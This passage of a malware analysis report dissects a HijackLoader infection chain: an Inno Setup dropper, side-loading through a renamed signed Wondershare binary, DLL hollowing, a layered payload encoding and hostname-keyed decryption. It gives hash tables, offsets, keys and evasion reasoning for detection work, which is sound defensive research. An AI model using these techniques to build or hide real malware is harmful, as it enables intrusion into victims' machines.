  <figcaption><em>Figure 2: Inno Setup Pascal Script bytecode for <code>InitializeSetup()</code>, decompiled with <code>ifpsdasm</code>. The function extracts all 17 bundle files via <code>ExtractTemporaryFile</code>, fires off <code>CrystSupervisor32.exe</code> via <code>WinExec</code>, then returns <code>False</code> — silently aborting the installer wizard while the payload is already running. This is the operator's signature anti-triage trick.</em></figcaption>
</figure>

**Why this defeats automated triage:**
- Sandboxes timing out at "wizard appeared" — fail (no wizard appears)
- Sandboxes timing out at `[Run]` section execution — fail (no `[Run]` section runs)
- Sandboxes flagging `WinExec` from a Pascal Script — most don't decompile `CompiledCode.bin`; they only inspect the `.iss` script, which doesn't show this
- Tooling-version evasion — `innounp 0.50` and `innoextract 1.9` fail to parse Inno Setup 6.5.x format, so defenders see "incompatible version" and assume the file is corrupt or not Inno Setup at all. The `jrathlev/innounp-2 v2.67.9` fork is required to extract.

<figure style="text-align: center; margin: 2em 0;">
  <img src="{{ "/assets/images/opendirectory-62-60-237-100-20260506/hijackloader-carriers-password-gate.png" | relative_url }}" alt="Ghidra decompiler view of the Carriers.exe entry-point password check, showing a comparison `if (DAT_004bc12c == '\x02')` followed by a nested check on DAT_004bc128 and a call that displays the wide string 'Please specify the password using the /PASSWORD= command line parameter.'">
  <figcaption><em>Figure 3: Carriers.exe entry-point password gate. The wrapper accepts an optional <code>/PASSWORD=</code> command-line argument; if a defender extracts the binary and runs it without one, this dialog appears. Most analysts hit this and assume the sample requires an unknown password to detonate — yet the Pascal Script's <code>InitializeSetup()</code> path runs <em>before</em> this gate, so the payload has already executed.</em></figcaption>
</figure>

#### 4.1.2 The 17 dropped files — multi-vendor camouflage bundle

The 17 files dropped by the Pascal Script into `%TEMP%\is-XXXXX.tmp\` form a multi-vendor camouflage bundle. The compile-timestamp distribution is the single discriminating diagnostic: 12 of the DLLs have 2005–2019 compile timestamps (genuine Wondershare / Microsoft camouflage); only `CrystSupervisor32.exe` (2025-02-25) and the operator artifacts (`networkspec17.log`, `shadermgr93.rc`) are 2025-built.

| File | Size | Verdict | Role |
|---|---|---|---|
| `CrystSupervisor32.exe` | 2,513,640 | Genuine Wondershare SlideShowEditor.exe (renamed) | Side-load HOST |
| `ExceptionHandler.dll` | 131,584 | Operator-modified Wondershare Plowshare crash reporter | Operator dispatcher / IPC router |
| `NLEService.dll` | 295,936 | Operator-rebuilt-but-unmodified Wondershare AudioClip service | Decoy |
| `BugSplat.dll` | 303,568 | Genuine BugSplat LLC (2015) | Camouflage |
| `COMSupport.dll` | 60,928 | Genuine Wondershare PureBasic DLL (2016) | Camouflage |
| `DBGHelp.dll` | 992,208 | Genuine Microsoft Debugging Tools (2005) | Camouflage |
| `DVDSetting.dll` | 42,496 | Genuine Wondershare PureBasic DLL (2018) | Camouflage |
| `NLEResource.dll` | 171,008 | Genuine Wondershare DLL (2018) | Camouflage |
| `NLETransitionMgr.dll` | 127,488 | Genuine Wondershare DLL (2018) | Camouflage |
| `WSUtilities.dll` | 186,368 | Genuine Wondershare DLL (2012) | Camouflage |
| `WS_ImageProc.dll` | 227,328 | Genuine Wondershare DLL (2016) | Camouflage |
| `WS_Log.dll` | 224,256 | Genuine Wondershare DLL (2019) | Camouflage |
| `WsBurn.dll` | 2,504,192 | Genuine Wondershare DLL (2018) | Camouflage |
| `networkspec17.log` | 2,607,970 | Operator encrypted payload (entropy 7.88) | Stage-3 LZNT1 carrier |
| `shadermgr93.rc` | 27,555 | Operator config blob (entropy 5.48) | Stage-1 loader input |
| `SlideShowEditor.ini` | 47 | Wondershare config marker | Camouflage |

Of the 17 files, only 3 are operator-controlled: `ExceptionHandler.dll` (the modified crash reporter that drives the loader chain), `networkspec17.log` (the encrypted Stage-3 payload), and `shadermgr93.rc` (the Stage-1 loader input config). The remaining 14 files are either genuine signed vendor binaries (camouflage) or operator-rebuilt-but-content-equivalent decoys.

### 4.2 CrystSupervisor32.exe — Renamed Wondershare SlideShowEditor.exe

**File facts:**

| Field | Value |
|---|---|
| Filename | `CrystSupervisor32.exe` |
| SHA256 (prefix) | `44f009ca…` (full hash in IOC feed) |
| Size | 2,513,640 bytes |
| Compiler | Embarcadero Delphi 2009 |
| VT detection | 0/72 |
| Authenticode signer | Wondershare Technology Group Co.,Ltd, valid 2022-04-08 to 2025-04-05 |
| Wondershare cert SHA1 thumbprint | `BC99A77A68F18005CAC0C784A176D3199F735ECF` |

This is the genuine signed Wondershare `SlideShowEditor.exe` from DVD Creator, **renamed to `CrystSupervisor32.exe`**. The Authenticode signature against the full DigiCert chain to Trusted Root CA verifies cleanly; 14 sister copies of this binary exist in legitimate `Program Files (x86)\Wondershare\DVD Creator\` paths since 2021-06-12.

The operator chose this binary because:
- The Authenticode signature is genuine (defenders heuristically trust signed binaries)
- It legitimately loads sister DLLs from its own directory via standard Windows DLL search-order behavior — DLL side-loading works without any exploit
- Wondershare DVD Creator install paths are common on consumer systems (low signal-to-noise in process-tree analysis)

**The operator does NOT modify the EXE itself.** Only two side-loaded DLLs are tampered: `ExceptionHandler.dll` (operator-modified Plowshare crash reporter — drives the loader chain) and `NLEService.dll` (operator-rebuilt but content-equivalent). The Authenticode signature on the EXE remains valid.

> **Note (capability surface):** static YARA analysis on `CrystSupervisor32.exe` identifies keylogger, screenshot, TLS-ClientHello-generator, escalate-priv, and TCP-socket capabilities. Whether those capabilities reflect the genuine SlideShowEditor's full feature surface or operator-modified internals cannot be determined from YARA hits alone. Confirmed at MODERATE confidence: the binary participates in the chain at runtime as a multi-purpose payload, not just a passive host.

### 4.3 ExceptionHandler.dll — Operator-Modified Wondershare Plowshare Crash Reporter

> **Analyst note:** This DLL is the engine of the loader chain. The operator started with the open-source Wondershare Plowshare (a crash-reporting library, similar to Google Breakpad), preserved the legitimate Wondershare branding, and added three small functions that turn the legitimate crash-report IPC channel into a covert dispatcher between operator stages. The function `FUN_100024B0` is the actual loader entry point — it walks the Process Environment Block, resolves Windows API addresses by hash, reads a small config file from disk, and uses it to hollow a Windows DLL with stage-2 shellcode. Defenders inspecting the DLL's strings see only Plowshare and Wondershare names; the operator added nothing visibly malicious to the strings table.

**File facts:**

| Field | Value |
|---|---|
| Filename | `ExceptionHandler.dll` |
| SHA256 (prefix) | `a3d0a9c7…` (full hash in IOC feed) |
| Size | 131,584 bytes |
| Compile timestamp | 2014 (operator preserved Wondershare's original Plowshare timestamp) |
| Compiler | Microsoft Visual C++ |
| **PDB path** | `I:\CompanySource\Plowshare\Src\Symbol\Release\ExceptionHandler.pdb` |
| Operator project codename | **"Plowshare"** (from PDB) |
| Named pipe | `\\.\pipe\WondershareCrashServices` |
| VT detection | 25/72 (single-submitter; first-seen 2026-03-12) |

The PDB path is one of the most diagnostic operator-identity artifacts in the corpus. `I:\CompanySource\Plowshare\…` suggests:
- An organized developer workflow with a dedicated build drive (`I:\`)
- A folder name `CompanySource` (suggests an organized multi-project codebase, not a one-off commodity build)
- A project codename `Plowshare` distinct from the Wondershare-branded VersionInfo

The named pipe `\\.\pipe\WondershareCrashServices` mimics legitimate Wondershare crash-reporter naming. The operator's modifications turn the Breakpad crash-report protocol into a covert IPC channel between stages.

#### 4.3.1 The reflective loader: `FUN_100024B0`

The loader entry-point function `FUN_100024B0` does the following:

1. **PEB-walk-based API hash resolution** (anti-string-extraction): no plaintext API names exist in the DLL. The operator's hash function uses `M = 2`, `K = 0x00287B05`, formula `h = (h << 1) + c`, applied to ASCII export names walked from `kernel32`'s `IMAGE_EXPORT_DIRECTORY`.
2. Resolves 6 `kernel32` APIs by hash: `CreateFileW`, `GetFileSize`, `ReadFile`, `VirtualProtect`, `LoadLibraryA`, plus `MultiByteToWideChar` (or equivalent for the conversion step).
3. Reads `shadermgr93.rc` (27,555 bytes) via `CreateFileW`.
4. Applies a **relocation step** to bytes within `shadermgr93.rc`:
   - Count = `0x1814` (6,164 bytes)
   - Delta = `0x0D1A8497`
   - Target = bytes starting at offset `0x538F` in `shadermgr93.rc`
   - Operation: read DWORD, ADD delta, write back
5. After relocation, the length-prefixed ASCII string `"tapisrv.dll"` is recovered at offset `0x538F` (length byte `0x0D`, name at `0x5390`).
6. Extracts a section descriptor at offset `0x539C`: 4 reserved bytes + 4-byte entry RVA (`0xED0`) + 4-byte section length (`0x16B0` = 5,808 bytes) + section bytes (start with x86 prologue `55 8B EC 83 EC 38`).
7. `LoadLibraryA("tapisrv.dll")` — loads the genuine Windows Telephony API Server DLL into process memory.
8. `VirtualProtect(tapisrv.text, 5808, PAGE_EXECUTE_READWRITE)` — opens its `.text` section for write.
9. `memcpy(tapisrv.text, &shadermgr93[0x53A8], 5808)` — overwrites tapisrv's executable section with the operator's stage-2 shellcode.
10. Calls `tapisrv.text + 0xED0` (the entry point per the section descriptor), passing `{flag=1, L"networkspec17.log", stack-buffer-ptr}` as arguments.

**This is classical DLL hollowing — but into a low-visibility Windows DLL.** Most EDR rules sample-check `kernel32`, `ntdll`, `wininet`, `urlmon` for memory-vs-disk integrity drift; few sample-check `tapisrv.dll` or `input.dll`. The hollow target choice is itself part of the evasion design.

### 4.4 Stage-2 Shellcode (5,808 bytes)

> **Analyst note:** Once the operator-modified DLL hollows `tapisrv.dll` and jumps to its `.text` section, control transfers to a compact 5,808-byte position-independent shellcode. The shellcode runs eight phases in sequence: it resolves Windows APIs by hash, runs anti-sandbox checks (multiple sleeps, debugger probes, performance-counter timing), reads the 2.6 MB encrypted payload from disk, peels off three layers of encoding (PNG-IDAT framing, XOR, LZNT1 decompression), and hollows a second Windows DLL (`input.dll`) with the result. None of this involves a user-visible window — all of it happens inside the address space of the side-load host process.

**File facts (extracted artifact):**

| Field | Value |
|---|---|
| Filename (analyst-named) | `stage2_shellcode.bin` |
| Source | bytes 0x53A8..0x6A57 of `shadermgr93.rc` after applying loader relocation |
| Size | 5,808 bytes (0x16B0) |
| SHA256 (prefix) | `8ad22e34…` (full hash in IOC feed) |
| Type | Position-independent x86 shellcode (NOT a PE) |
| Entry point | offset 0xED0 within the shellcode |

#### 4.4.1 The eight-phase architecture

<figure style="text-align: center; margin: 2em 0;">
  <img src="{{ "/assets/images/opendirectory-62-60-237-100-20260506/hijackloader-stage2-eight-phase-architecture.svg" | relative_url }}" alt="Vertical infographic of the stage-2 shellcode 8-phase architecture, 5808 bytes, runs after first DLL hollow into Windows tapisrv.dll. Phase 1 (red) API Resolution via X65599 hash with multiplier M = 0x0001003F = 65,599 and hash form h = h * M + utf16_char, ~17 of 21 API slots resolved by walking the PEB ntdll exports. Phase 2 (red) api_table populated at slots +0x04 through +0x7c with 17 named APIs known and 4 slots unidentified. Phase 3 (orange) Anti-Sandbox Quadruple gated by FUN_000002c0, four checks shown in 2x2 grid: ZwQueryInformationProcess (anti-debug), ZwDelayExecution × 9 × 5000ms (45-second sleep evading sandbox timeouts), QueryPerformanceCounter (timing fingerprint), ZwQuerySystemInformation (process enumeration / sandbox detection). Phase 4 (yellow) ReadFile of networkspec17.log 2.6 MB encrypted blob with wide-string filename passed from stage-1. Phases 5/5b/6 (purple) 3-Layer Decode Pipeline shown as horizontal pipe: Layer 1 PNG-IDAT chunk walker stripping fake IDAT framing using IDAT/IEND sentinels, then Layer 2 4-byte in-place XOR with key 0xE1D5B4A2 stored at file offset 4-7 (fork-specific, canonical key is 32 A3 49 B3), then Layer 3 LZNT1 chunked decompression via RtlDecompressBuffer producing 3.75 MB output. Phase 7 (blue) DLL Hollow #2 into Windows input.dll, reading target name from Layer-3 offset 0xf4 (%windir%\\SysWOW64\\input.dll), ExpandEnvironmentStringsW resolving to C:\\Windows\\SysWOW64\\input.dll, LoadLibraryW, VirtualProtect with PAGE_EXECUTE_READWRITE, memcpy of stage-3 section bytes. Phase 8 (red) Transfer Control via call to input.text + entry, second DLL hollow completes and control passes to stage-3 HijackLoader proper. Footer: detection anchors include api_table layout, X65599 multiplier 0x0001003F, anti-sandbox quadruple co-location, XOR key 0xE1D5B4A2.">
  <figcaption><em>Figure 4: Stage-2 shellcode 8-phase architecture. The flow goes API resolution → anti-sandbox gate → encrypted-payload read → 3-layer decode → second DLL hollow into <code>input.dll</code> → transfer control to stage-3. Detection anchors at the bottom (<code>api_table</code> layout, X65599 multiplier, anti-sandbox quadruple co-location, XOR key <code>0xE1D5B4A2</code>) are the YARA-anchorable fingerprints for stage-2.</em></figcaption>
</figure>

#### 4.4.2 API hash table (17 of 21 slots identified)

The API hash table acts as an anchor for YARA detection — the layout of slots, the multiplier, and the four anti-sandbox APIs co-located within the same 0x14B-byte config region together form a distinctive fingerprint.

| Offset | Hash value | API resolved | Module |
|---|---|---|---|
| `+0x014` | `0xeef5694f` | `GlobalFree` | kernel32 |
| `+0x018` | `0x9c7b048e` | **`ZwQueryInformationProcess`** (anti-debug) | ntdll |
| `+0x02c` | `0x0ad845a8` | `GetTempPathW` | kernel32 |
| `+0x050` | `0xb403b62d` | `RtlDecompressBuffer` | ntdll |
| `+0x058` | `0x6a7efb32` | **`ZwDelayExecution`** (anti-sandbox sleep) | ntdll |
| `+0x06c` | `0xf738bf4d` | `GetModuleHandleW` | kernel32 |
| `+0x0a0` | `0x4a9784b4` | **`QueryPerformanceCounter`** (timing fingerprint) | kernel32 |
| `+0x0a4` | `0x0d7ef57d` | `swprintf` (UTF-16 formatted string builder) | ntdll CRT |
| `+0x0a8` | `0xf296d173` | `GetFileSize` | kernel32 |
| `+0x0ac` | `0x4650882e` | `GetModuleFileNameW` | kernel32 |
| `+0x0b4` | `0x1b474400` | `CloseHandle` | kernel32 |
| `+0x0b8` | `0x96be8872` | `ReadFile` | kernel32 |
| `+0x0ec` | `0x0b23cae4` | `VirtualProtect` | kernel32 |
| `+0x0f4` | `0xdf2bbc02` | `LoadLibraryW` | kernel32 |
| `+0x110` | `0xd0699a52` | `GlobalAlloc` (uses `LMEM_ZEROINIT = 0x40`) | kernel32 |
| `+0x11c` | `0x8df4451f` | `CreateFileW` | kernel32 |
| `+0x13c` | `0xae69e6d2` | **`ZwQuerySystemInformation`** (anti-sandbox system probe) | ntdll |

The **anti-sandbox quadruple** (`ZwQueryInformationProcess` + `ZwDelayExecution` + `QueryPerformanceCounter` + `ZwQuerySystemInformation` co-located within the same 0x14B-byte config region) is the most distinctive YARA-anchorable pattern for stage-2.

<figure style="text-align: center; margin: 2em 0;">
  <img src="{{ "/assets/images/opendirectory-62-60-237-100-20260506/hijackloader-stage2-ascii-utf16-helpers.png" | relative_url }}" alt="Two side-by-side Ghidra decompilations of stage-2 helper functions: FUN_00000a10 (a __thiscall function that loops over an input buffer and widens each ASCII char to a short, terminating with a null short) and FUN_00000890 (a wcslen-equivalent that loops counting non-zero shorts in a UTF-16 string).">
  <figcaption><em>Figure 5: Stage-2 string-handling helper pair — an inline ASCII-to-UTF-16 widener (left) and a wcslen-equivalent (right). Both are needed because the API hash table targets <code>ntdll</code> exports (which use <code>UNICODE_STRING</code>) while the shellcode itself works in narrow ASCII. Their presence is a YARA-anchorable signal that the binary builds Unicode strings on the fly rather than carrying them as compile-time constants.</em></figcaption>
</figure>

### 4.5 networkspec17.log — Encrypted Stage-3 Carrier

> **Analyst note:** This is the 2.6 MB file that contains the bulk of the loader chain — it gets decoded in three layers and unpacks into 3.75 MB of stage-3 content (eight embedded PE files, the path string for the next hollow target, and persistence-path strings). The first ~16 KB of the file is camouflaged to look like English text — that is a deliberate trick to make a defender opening the file in a text editor or `strings` dump dismiss it as benign log content. The body of the file is wrapped in fake PNG-IDAT chunks, then XOR'd with a 4-byte key that is stored in plaintext at file offset 4–7 of the file itself, then LZNT1-compressed in chunks. None of this is sophisticated cryptography — it's deliberate format-level camouflage at a level that automated triage and casual hex-editor inspection both miss.

**File facts:**

| Field | Value |
|---|---|
| Filename | `networkspec17.log` |
| SHA256 (prefix) | `7e2000ce…` (full hash in IOC feed) |
| Size | 2,607,970 bytes (2.6 MB) |
| Overall entropy | 7.879 |
| Two-zone structure | Head 0x0000–0x4000 (printable, low entropy ~4.3) + Body 0x4000–end (high entropy ~7.5) |

#### 4.5.1 Text-frequency-preserving camouflage cipher in head zone

The first ~16 KB of `networkspec17.log` (and ~21 KB of `shadermgr93.rc`) is **letter-frequency-preserving scrambled English text**. Chi-square fit to English plaintext is 857 (very strong English match; reference English plaintext ~0). The byte-frequency distribution preserves `e`-then-`t`-then-`a`/`o` ordering (English natural-language signal). This rules out AES/ChaCha20/RC4 (which produce uniform high entropy) and substitution ciphers (which preserve length but not letter frequency).

**Strongest candidate explanation:** columnar transposition (or similar permutation) applied to a long English text source — possibly a Project Gutenberg book, Wikipedia article, OCR'd document, or operator's own Pascal Script source.

The text head serves no cryptographic purpose visible in the analyzed loader chain. Its role is **defender camouflage** — a defender opening the file in a hex editor, text editor, or `strings` dump sees "English-looking text in a `.log` / `.rc` file" and may dismiss the file as benign log content rather than recognize an encrypted payload. Most malware encrypted-payload formats produce uniformly high-entropy bytes; the operator's text-head camouflage exploits the analyst-pipeline assumption that "looks like text → benign."

#### 4.5.2 Three-layer body encoding

**Layer 1 — PNG IDAT chunk framing.** The body zone (offset `0x4000+`) is wrapped in PNG IDAT chunk framing. The 16-byte un-XOR'd metadata header has the pattern:

```
[c6 a5 79 ea] | [e1 d5 b4 a2] | [comp_sz_LE] | [uncomp_sz_LE]
```

Where `c6 a5 79 ea` is the operator's first-chunk-type marker, `e1 d5 b4 a2` is the Layer-2 XOR key (stored in plaintext at file offset 4–7 — defender can read the key directly from the file), and `IDAT` (`49 44 41 54`) and `IEND` (`49 45 4e 44`) sentinels delimit each chunk. Stage-2's `walk_idat_chunks` function strips the framing.

**Layer 2 — 4-byte rotating XOR with key `0xE1D5B4A2`.** After Layer-1 stripping, the operator XORs the resulting bytes with the 4-byte key `0xE1D5B4A2` (little-endian). The key is per-build but visible at file offset 4–7 of `networkspec17.log` itself — anyone parsing the format can recover it. **Note the divergence from canonical published HijackLoader analyses**, which document the key as `32 A3 49 B3` — this build uses a fork-specific XOR key.

**Layer 3 — LZNT1 chunked decompression (3.75 MB output).** After Layer-2 XOR, the result is LZNT1-compressed in chunks. **Whole-buffer LZNT1 fails; only chunked LZNT1 succeeds.** Stage-2 calls `RtlDecompressBuffer` per chunk and concatenates outputs. Total decompressed: 3,751,936 of 3,752,455 bytes (99.99%).

**The 3.75 MB Layer-3 output contains 8 embedded PE files**, plus the second-stage hollow target name (`%windir%\SysWOW64\input.dll`, UTF-16 string at offset `0xf4`), plus persistence path strings (`adv_ctrl` UTF-16 at offset `0x63be8`, plus Startup folder reference).

<figure style="text-align: center; margin: 2em 0;">
  <img src="{{ "/assets/images/opendirectory-62-60-237-100-20260506/hijackloader-networkspec17-mz-header.png" | relative_url }}" alt="Hex dump of networkspec17.log showing the file header region from offset 0x00B0 to 0x01B0. The first half shows the camouflage text-zone bytes; at offset 0x0100 a clear MZ-DOS header (4D 5A 90 00 03 00 00 00 04 00 00 00) appears in highlighted form, followed by 'This program cannot be run in DOS mo&lt;e' at offset 0x014E, marking the start of the embedded stage-3 PE bundle once the IDAT-XOR-LZNT1 layers are stripped.">
  <figcaption><em>Figure 6: Hex view of <code>networkspec17.log</code> after the layered decoding (IDAT framing → XOR → LZNT1) is reversed. The MZ-DOS header surfacing at offset 0x0100 confirms that the recovered 3.75 MB blob carries an embedded PE bundle — the eight stage-3 PEs (HijackLoader proper, GoProxy CA installer, multi-vendor camouflage binaries) sit in this exposed payload.</em></figcaption>
</figure>

### 4.6 Stage-3 PE Bundle — Multi-Vendor Camouflage

The 3.75 MB Layer-3 buffer contains 8 embedded PE files. After VT cross-checking, only **3 of 8** are operator-controlled:

| PE | SHA256 (prefix) | Verdict | Confidence | VT detections |
|---|---|---|---|---|
| pe_01 | `fcebe8be…` | GENUINE — Crisp Squirrel StubExecutable (paulb's Squirrel.Windows) | HIGH | NOT on VT |
| pe_02 | `c50bffbe…` | GENUINE — Info-ZIP `zip.exe` v3.0 (signed) | DEFINITE | (already known legit) |
| **pe_03** | **`68fb6122…`** | **HijackLoader / Penguish / Rugmi / GhostPulse PROPER** | **DEFINITE** | **52/70 + Heaven's Gate YARA** |
| pe_04 | `3594a835…` | GENUINE — Google Updater stub | HIGH | 9/72 (FP, major AVs clean) |
| pe_05 | `729e5965…` | GENUINE — Google Updater component | HIGH | 8/72 (FP, major AVs clean) |
| **pe_06** | **`68bee500…`** | **Rugmi.HP — GoProxy CA cert installer** | **DEFINITE** | **50/71** |
| **pe_07** | **`2d8728f0…`** | **Operator-bespoke bundle-cleanup helper** (campaign-unique) | **HIGH** | NOT on VT |
| pe_08 | `ca9f859f…` | GENUINE — Qihoo 360 PromoUtil.exe | HIGH | NOT on VT |

This is **multi-vendor camouflage at the bundle layer**: 4 genuine vendor binaries (Crisp Squirrel + Info-ZIP zip + Google Updater + Qihoo 360 PromoUtil — each with valid VersionInfo, PDB, signature) co-located alongside 3 malicious operator-controlled PEs. Bundle-LAYOUT tradecraft, not code-level.

<figure style="text-align: center; margin: 2em 0;">
  <img src="{{ "/assets/images/opendirectory-62-60-237-100-20260506/hijackloader-bundle-vt-operator-vs-legit.png" | relative_url }}" alt="Three VirusTotal result panels stacked vertically. Top panel: WSUtilities.dll, status Undetected (0 detections), tagged 'distributed by Sourcr16 Software', WS-Utilities, signed-valid. Middle panel: ExceptionHandler.dll, status Malicious, 26 of 63 detections, tagged 'detect-debug-environment', mongo, hijackloader, fojrak, detect-debug-environment, peed. Bottom panel: NLEService.dll, status Malicious, 14 of 73 detections, tagged 'United States', '14/73 security vendors flagged this file as malicious', detect-debug-environment, peed.">
  <figcaption><em>Figure 7: VirusTotal side-by-side comparison of three DLLs from the same Carriers.exe bundle. <code>WSUtilities.dll</code> (top) is a genuine signed Wondershare DLL with zero detections. <code>ExceptionHandler.dll</code> (middle) and <code>NLEService.dll</code> (bottom) carry the same Wondershare-style filenames and metadata but are operator-rebuilt — VirusTotal flags both as malicious (26/63 and 14/73 respectively) with HijackLoader and debug-environment-detect tags. The contrast is the point: the operator places real signed Wondershare DLLs next to operator-modified ones with matching filenames, making file-name and "Wondershare-DLL"-based whitelists ineffective.</em></figcaption>
</figure>

**Why this is operator-clever:** defenders scanning hashes get matches against a Crisp install + Google Updater + Qihoo 360 + zip utility — looks like a normal install dropper output. The malicious PEs (`pe_03`, `pe_06`, `pe_07`) are 4 of 8, tightly buried.

### 4.7 pe_03 — HijackLoader / Penguish / Rugmi Proper

> **Analyst note:** This is the actual HijackLoader binary inside the bundle — the publicly documented commodity loader. What's worth noting in this build is that it resolves Windows APIs using the `RtlHashUnicodeString` function from `ntdll` rather than implementing its own custom hash. That sounds dry but is operator-clever — it means the binary contains no readable hash function (because the function lives in `ntdll`, not in the binary), making static analysis of the API resolution layer slower than for the more typical inline-hash-function approach. It also derives a per-host key from the computer name using the same hash, which is what gates decryption of the final payload.

**File facts:**

| Field | Value |
|---|---|
| SHA256 (prefix) | `68fb6122…` (full hash in IOC feed) |
| Size | 336,644 bytes (3,584 `.text`, 1,024 `.rdata`, 512 `.pdata`, 512 `.rsrc`, 329,988-byte overlay) |
| Compile timestamp | 2023-07-10 06:20:00 UTC |
| Single export | `ord_1` |
| Imports | empty (`ImportTableIsBad` YARA — APIs resolved at runtime via PEB walking + hash matching) |
| Architecture | x86_64 |
| YARA family hits | `Windows_Trojan_GhostPulse_caea316b` (Elastic), `HeavensGate` (CAPE), `maldoc_find_kernel32_base_method_1`, `CRC32b_poly_Constant`, `ImportTableIsBad` |
| VT family labels | Microsoft `TrojanDownloader:Win64/Rugmi.HNL!MTB`, Kaspersky `HEUR:Trojan.Win64.Penguish.e`, C2AE `HijackLoader` |

<figure style="text-align: center; margin: 2em 0;">
  <img src="{{ "/assets/images/opendirectory-62-60-237-100-20260506/hijackloader-pe03-main-pipeline.png" | relative_url }}" alt="Ghidra decompiler view of pe_03 function FUN_1400012b0, the main loader pipeline. Locals declared include uVar2, local_238, local_234, local_230, local_228 and a 536-byte stack array local_218. The function calls FUN_140001690 with 0x208, indexes into a function table at param_1+0x20 with arguments 0,0x20a,0x1000,4, calls FUN_140001bc0 with the constant 0xa1b2d3b4 (the per-host KDF magic), then dispatches via param_1+0x40 with size 0x104 — which decides the conditional branches that read and decrypt payload bytes via FUN_1400001aa0 and FUN_140001d10.">
  <figcaption><em>Figure 8: pe_03 main pipeline (function <code>FUN_1400012b0</code>). The dispatch table at <code>param_1+0x20…+0x40</code> is the runtime-resolved API table; the call to <code>FUN_140001bc0</code> with the magic constant <code>0xa1b2d3b4</code> is the per-host key derivation routine examined in Section 4.7.2. This single function ties the API-hash layer (Section 4.7.1) and the per-host crypto layer together — control flows from API resolution into payload decryption inside the same dispatcher.</em></figcaption>
</figure>

#### 4.7.1 Under-documented TTP: API hash via `ntdll!RtlHashUnicodeString`

Public HijackLoader / Penguish reporting (Zscaler ThreatLabz, Trellix, Bahlai Medium, Elastic Security Labs) consistently describes inline custom hashing — typically DJB2 with operator-set initial value, or custom CRC32 variants. Using `ntdll!RtlHashUnicodeString` as the hash function is rarely discussed in public research and provides three independent layers of static-analysis evasion:

1. No readable strings in the binary (anti-string-extraction)
2. No readable hash function in the binary (the function is in `ntdll`, not pe_03)
3. The resolver pattern requires recognition to identify the algorithm — defenders may waste hours trying to reverse what they think is custom code

**Algorithm** (per Microsoft documentation / Wine source):

```c
ULONG hash = 0;
for each WCHAR c in UNICODE_STRING.Buffer (Length / 2 chars):
    if (CaseInSensitive) c = RtlUpcaseUnicodeChar(c);
    hash = hash * 65599 + c;
return hash;
```

Pure multiply-and-add. Constant 65599 is the X65599 polynomial (also called the SDBM hash multiplier).

**How pe_03 finds this API:** walks the PEB-resolved `ntdll`'s `IMAGE_EXPORT_DIRECTORY`, looks for the export with **length exactly 20** AND **first 4 bytes equal to `"RtlH"`** (`0x52 0x74 0x6c 0x48`). The unique 20-character `ntdll` export starting with "RtlH" is `RtlHashUnicodeString`. Brittle but effective signature.

<figure style="text-align: center; margin: 2em 0;">
  <img src="{{ "/assets/images/opendirectory-62-60-237-100-20260506/hijackloader-pe03-rtlhash-wrapper.png" | relative_url }}" alt="Ghidra decompiler view of pe_03 function FUN_1400019d0 (the RtlHashUnicodeString wrapper). The wrapper takes two longlong parameters, calls helper FUN_140001790 to compute the UTF-16 length of param_2, populates local_20 (length in bytes) and local_1e (length plus terminator) for the UNICODE_STRING structure, sets local_24 to zero (the result hash slot), then dispatches through the resolved API table at param_1+0x170 with the constructed UNICODE_STRING and the result-pointer, returning local_24.">
  <figcaption><em>Figure 9: pe_03's tiny <code>RtlHashUnicodeString</code> wrapper (function <code>FUN_1400019d0</code>). The wrapper builds the <code>UNICODE_STRING</code> structure on the stack (length / max-length / buffer-pointer triple) and calls through the resolved API slot at <code>param_1+0x170</code>. Because the actual hash math lives inside <code>ntdll</code>, the binary itself contains no hash function and no readable strings — defenders trying to reverse a custom hash algorithm will find nothing here, which is the entire point of the technique.</em></figcaption>
</figure>

**Decoded API hash table:**

| Hash | Module | API | Role |
|---|---|---|---|
| `0xDF2BBC02` | kernel32 | `LoadLibraryW` | Load arbitrary DLLs |
| `0x39D1A64A` | kernel32 | `VirtualAlloc` | Allocate buffers for strings and decrypted payload |
| `0x8DF4451F` | kernel32 | `CreateFileW` | Open files for reading |
| `0x96BE8872` | kernel32 | `ReadFile` | Read encrypted payload bytes from disk |
| `0x1B474400` | kernel32 | `CloseHandle` | Cleanup |
| `0x51E1B15E` | kernel32 | `GetEnvironmentVariableW` | Resolve `%APPDATA%` / `%TEMP%` paths |
| `0xCBB35ABB` | kernel32 | **`GetComputerNameW`** | **Per-host seed source** |
| `0xE83AF065` | msvcrt | `rand` | PRNG |
| `0x6B699DD8` | msvcrt | `srand` | Seed PRNG with hostname-derived value |
| `0xF296D173` | kernel32 | `GetFileSize` | File size before reading |
| `0xD0699A52` | kernel32 | `GlobalAlloc` | Alternate allocator |

#### 4.7.2 Per-host execution guardrail via hostname-keyed crypto

`FUN_140001bc0` — Per-host random env var name generator + decryption key derivation:

```
1. GetComputerNameW(local_50, &local_64=16) -> hostname (wide chars)
2. RtlHashUnicodeString(hostname, FALSE, X65599, &hash)
3. seed = hash XOR 0xa1b2d3b4
4. srand(seed)
   *param_3 = seed   (exports seed to caller as DECRYPTION KEY)
5. length = wcslen(hostname) + 3 + (rand() % 8)   (8-16 chars)
6. for i in 0..length:
       output_buffer[i] = (WCHAR)('A' + (rand() % 26))   (uppercase A-Z)
7. Returns: per-host-deterministic uppercase WCHAR string
```

**The same seed is used for two purposes:**
1. As a PRNG seed to generate the env var name (looked up later via `GetEnvironmentVariableW`)
2. As the decryption key for the loaded payload file

Operationally efficient (only one secret to store) but cryptographically lazy — a defender who recovers ONE use of the seed automatically recovers both.

**Why this is a guardrail:**
- Captured payloads cannot be statically decrypted on a different machine (sandbox emulation in a sandbox VM with a different hostname will fail to decrypt)
- Detection rules looking for a fixed env var name will be defeated (per-host name)
- Re-infection of the same host produces the same env var name (deterministic)

**Honest caveat (Round 13 retraction):** the static reverse identified the structural pattern. Round 13 dynamic data did NOT validate the exact byte-level algorithm — no FLARE-derived seed produces the observed env var name `EUOJCZYGOUCUG`, and a 1M-seed brute force does not find a match. The TTP characterization (per-host hostname-keyed crypto for env var + decryption key) is correct at HIGH confidence. The exact byte-level algorithm is at MODERATE confidence — something material in the algorithm (rand-consume order, alphabet, RNG, hash function, OR seed source) was missed in the static reverse.

<figure style="text-align: center; margin: 2em 0;">
